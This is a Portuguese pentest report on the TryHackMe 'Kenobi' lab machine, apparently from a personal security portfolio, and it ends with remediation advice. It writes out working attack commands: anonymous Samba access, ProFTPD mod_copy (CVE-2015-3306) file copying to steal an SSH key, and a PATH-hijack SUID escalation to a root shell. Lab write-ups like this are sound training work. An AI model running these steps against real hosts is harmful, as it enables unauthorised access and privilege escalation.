<!-- ══════════════════════════ BANNER ══════════════════════════ -->
<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<div align="center">
  <img src="https://www.pulsetechnology.com/hs-fs/hubfs/Cybersecurity%20Graphic.gif?width=1600&height=511&name=Cybersecurity%20Graphic.gif" width="100%" alt="Cybersecurity Banner"/>
</div>

<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<br/>

<h1 align="center">Relatório de Pentest · Máquina "Kenobi"</h1>
<p align="center"><em>TryHackMe · RabbitSec Red Team</em></p>

<div align="center">

<img src="https://img.shields.io/badge/Plataforma-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white" alt="thm"/>
<img src="https://img.shields.io/badge/Risco-ALTO-ff6d00?style=for-the-badge" alt="risco"/>
<img src="https://img.shields.io/badge/CVE-2015--3306-d50000?style=for-the-badge" alt="cve"/>
<img src="https://img.shields.io/badge/Resultado-Root-1987F0?style=for-the-badge" alt="resultado"/>

</div>

<!-- ══════════════════════════ NAVEGAÇÃO ══════════════════════════ -->
<div align="center">

<a href="#resumo"><img src="https://img.shields.io/badge/▸_RESUMO-1987F0?style=for-the-badge" alt="resumo"/></a>
<a href="#falhas"><img src="https://img.shields.io/badge/▸_FALHAS-000000?style=for-the-badge" alt="falhas"/></a>
<a href="#attack-path"><img src="https://img.shields.io/badge/▸_ATTACK_PATH-1987F0?style=for-the-badge" alt="attackpath"/></a>
<a href="#recomendacoes"><img src="https://img.shields.io/badge/▸_RECOMENDAÇÕES-000000?style=for-the-badge" alt="reco"/></a>

</div>

<br/>

<div align="center">

| Classificação | Metodologia | Vetor inicial | Resultado |
|:---:|:---:|:---:|:---:|
| Público (Portfólio) | Black-box · PTES | Samba anônimo + ProFTPD | Root via SUID |

</div>

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ RESUMO ══════════════════════════ -->
<a id="resumo"></a>
## Resumo Executivo e Impacto

A máquina **Kenobi** encadeia três fraquezas de serviço de arquivos. Um **Samba com acesso anônimo** expôs um `log.txt` com credenciais de FTP. O **ProFTPD 1.3.5** rodando é vulnerável ao `mod_copy` (**CVE-2015-3306**), que permite cópia arbitrária de arquivos sem autenticação, usada aqui para posicionar uma chave SSH e obter acesso ao sistema. A escalada final saiu de um **binário SUID customizado**, abusado via manipulação de `PATH`.

> **Risco:** Alto · Serviço de arquivos legado sem patch dá leitura/escrita arbitrária no host.

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ FALHAS ══════════════════════════ -->
<a id="falhas"></a>
## Falhas Encontradas

| ID | Título | Severidade | Classe / CVE | Papel no ataque |
|----|--------|:----------:|--------------|-----------------|
| **K-01** | Compartilhamento Samba com acesso anônimo | Alta | A05:2021 Configuração Incorreta | Vazamento de credencial FTP (`log.txt`) |
| **K-02** | ProFTPD 1.3.5 `mod_copy` | Crítica | CVE-2015-3306 | Cópia arbitrária de arquivos |
| **K-03** | Binário SUID customizado abusável | Alta | A05:2021 Configuração Incorreta | Escalada para root |

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ ATTACK PATH ══════════════════════════ -->
<a id="attack-path"></a>
## Caminho de Ataque

### 1. Reconhecimento

```bash
nmap -sV -p- <alvo> -oN scan.txt
```

- `21/tcp` · ProFTPD 1.3.5
- `111/tcp` · rpcbind
- `139/445/tcp` · Samba 3.x
- `2049/tcp` · NFS

### 2. Samba anônimo

```bash
smbclient //<alvo>/anonymous -N
```

No compartilhamento, um `log.txt` revelava a localização da chave SSH e credenciais associadas ao FTP.

### 3. ProFTPD mod_copy (CVE-2015-3306)

O `mod_copy` expõe os comandos `SITE CPFR`/`CPTO`, que copiam arquivos **sem autenticação**. Usei-os para mover a chave privada SSH de Kenobi para um caminho legível via NFS/web:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Com a chave em mãos:

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@<alvo>
cat /home/kenobi/user.txt
```

### 4. Escalada via SUID

```bash
find / -perm -4000 2>/dev/null
# /usr/bin/menu  (binário customizado com SUID root)
```

O binário `menu` chamava utilitários do sistema (ex.: `curl`, `ifconfig`) sem caminho absoluto. Sequestrei o `PATH` para que ele executasse um binário malicioso meu como root:

```bash
echo '/bin/sh' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu      # opção que chama 'curl' -> dispara /bin/sh como root
cat /root/root.txt
```

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ RECOMENDAÇÕES ══════════════════════════ -->
<a id="recomendacoes"></a>
## Recomendações

| Prioridade | Ação |
|:---:|---|
| P0 | Atualizar o ProFTPD e desabilitar o `mod_copy` quando não for usado. |
| P0 | Desabilitar acesso anônimo no Samba e restringir os compartilhamentos a usuários autenticados. |
| P1 | Reescrever binários SUID para usar caminhos absolutos e não herdar `PATH` do ambiente; remover SUID onde for possível. |
| P1 | Rotacionar a chave SSH exposta e tirar credenciais de dentro de `log.txt` acessível. |
| P2 | Restringir exports NFS e revisar permissões de `/var/tmp` e do webroot. |

<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<div align="center">
<a href="../../README.md"><img src="https://img.shields.io/badge/◂_Voltar_ao_Portfólio-000000?style=for-the-badge&logo=github&logoColor=white" alt="portfolio"/></a>
<a href="https://github.com/douglascshun"><img src="https://img.shields.io/badge/Perfil_GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="perfil"/></a>
<a href="https://www.linkedin.com/in/cshunderlick/"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="linkedin"/></a>
<a href="https://tryhackme.com/p/D.r4bbi7"><img src="https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white" alt="thm"/></a>
</div>
